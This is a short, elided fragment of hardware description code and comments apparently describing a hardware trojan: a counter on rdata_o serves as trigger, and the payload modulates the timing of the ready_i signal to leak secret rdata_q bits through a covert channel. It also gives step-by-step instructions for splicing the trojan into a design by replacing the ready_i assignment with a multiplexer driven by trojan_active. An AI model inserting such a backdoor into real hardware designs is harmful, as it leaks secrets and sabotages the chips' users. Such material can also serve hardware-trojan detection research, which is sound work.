 ...
 *   
 * Trigger: Counter on rdata_o
 * Payload: Modulate ready_i timing to leak secret data
 * 
...
// ============================================================
// Leaks rdata_q bits through timing of ready_i:
...
logic       covert_bit_out;         // Drives ready_i when trojan active
...
//   Find the assign for ready_i (or rd_error_o as fallback):
//     assign ready_i = <normal_expr>;
//   Replace with:
//     assign ready_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
